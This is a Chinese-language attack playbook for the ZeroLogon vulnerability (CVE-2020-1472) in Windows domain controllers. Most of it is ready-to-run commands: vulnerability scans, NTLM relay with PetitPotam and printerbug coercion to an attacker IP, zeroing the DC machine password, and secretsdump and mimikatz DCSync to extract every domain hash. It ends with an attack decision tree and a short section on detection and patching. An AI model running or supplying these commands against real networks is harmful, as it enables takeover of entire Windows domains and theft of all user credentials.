# CVE-2020-1472 ZeroLogon 攻击与恢复

Netlogon 协议 AES-CFB8 实现缺陷：使用全零 IV，攻击者可在平均 256 次尝试内以零密文通过认证，将域控机器账户密码置空后 DCSync 提取全域哈希。

---

## 原理

- Netlogon 使用 AES-CFB8 模式进行 ComputeNetlogonCredential 运算
- IV 固定为全零（16 字节 0x00）
- 当 client challenge 也为全零时，约 1/256 概率密文输出同为全零
- 认证通过后可调用 NetrServerPasswordSet2 将 DC 机器密码置为空
- 机器密码置空后可直接 DCSync（DC 机器账户默认有复制权限）

---

## 漏洞检测

```bash
# 检测目标 DC 是否存在漏洞（不修改密码）
zerologon-scan '$DC_NAME' '$DC_IP'

# netexec 检测
netexec smb $DC_IP -u '' -p '' -M zerologon
```

---

## 方法一 — 认证 Relay（推荐，无破坏性）

不修改机器密码，通过 Netlogon 认证触发 NTLM 中继完成 DCSync。

### 前置条件
- 至少两台域控（DC1 中继到 DC2）
- 攻击机网络可达两台 DC

### 攻击步骤

```bash
# 1. 启动 ntlmrelayx 监听，目标为 DC2 的 DCSync
ntlmrelayx -t dcsync://$DC2 -smb2support

# 2. 利用 Print Spooler 或 PetitPotam 触发 DC1 认证到攻击机
dementor.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $DC1

# 替代触发方式
python3 PetitPotam.py $ATTACKER_IP $DC1
printerbug.py $DOMAIN/$USER:$PASSWORD@$DC1 $ATTACKER_IP
```

### 结果
- ntlmrelayx 自动完成 DCSync，输出域内所有哈希

---

## 方法二 — 密码置空攻击（破坏性）

将 DC 机器账户密码置为空后 DCSync。必须在攻击后恢复密码，否则域复制中断。

### 攻击步骤

```bash
# 1. 利用漏洞将 DC 机器密码置空
zerologon-exploit '$DC_NAME' '$DC_IP'

# 2. 用空密码 DCSync 提取 DC 机器账户哈希
secretsdump -no-pass '$DOMAIN/$DC_NAME$'@'$DC_FQDN'

# 3. 用获取的域管哈希 DCSync 提取全部哈希
secretsdump -hashes :$NTHASH '$DOMAIN/$ADMIN'@'$DC_FQDN'

# 4. 保存原始机器密码哈希（hex），用于恢复
# secretsdump 输出中 $DC_NAME$:plain_password_hex: 即为 HEXPASS
```

### 恢复机器密码（必须执行）

```bash
# 使用 zerologon-restore 恢复
zerologon-restore '$DOMAIN/$DC_NAME$'@'$DC_FQDN' -target-ip $DC_IP -hexpass $HEXPASS

# 验证恢复成功
secretsdump -hashes :$NTHASH '$DOMAIN/$ADMIN'@'$DC_FQDN' -just-dc-user '$DC_NAME$'
```

不恢复密码的后果：
- 域控之间复制失败
- DNS 服务异常
- 组策略无法更新
- 域内服务逐步崩溃

---

## Windows 攻击方式（mimikatz）

```
# 利用漏洞
lsadump::zerologon /target:$DC_FQDN /ntlm /null /account:$DC_NAME$ /exploit

# DCSync 提取哈希
lsadump::dcsync /domain:$DOMAIN /dc:$DC_FQDN /user:krbtgt /authuser:$DC_NAME$ /authdomain:$DOMAIN /authpassword:"" /authntlm

# 恢复机器密码
lsadump::postzerologon /target:$DC_FQDN /account:$DC_NAME$
```

---

## 检测与防御

### 日志检测
- **Event ID 4742**: 计算机账户被修改（机器密码变更）
- **Event ID 5805**: Netlogon 认证失败（大量尝试特征）
- **Event ID 5723**: 域控与其他 DC 间 Netlogon 会话建立失败

### 网络检测
- 短时间内大量 Netlogon 认证请求（RPC over TCP 135/445）
- Client challenge 全零特征

### 防御措施
- 安装 KB4571694 补丁
- 启用 FullSecureChannelProtection 注册表项
- 组策略：Domain controller: Allow vulnerable Netlogon secure channel connections → 设为 Disabled

---

## 攻击决策

```
发现域控？
├─ 扫描 zerologon → 存在漏洞
│  ├─ 有两台 DC → 方法一 Relay（推荐，无破坏）
│  └─ 仅一台 DC → 方法二密码置空（⚠️ 必须恢复）
└─ 已修补 → 尝试其他攻击路径
```
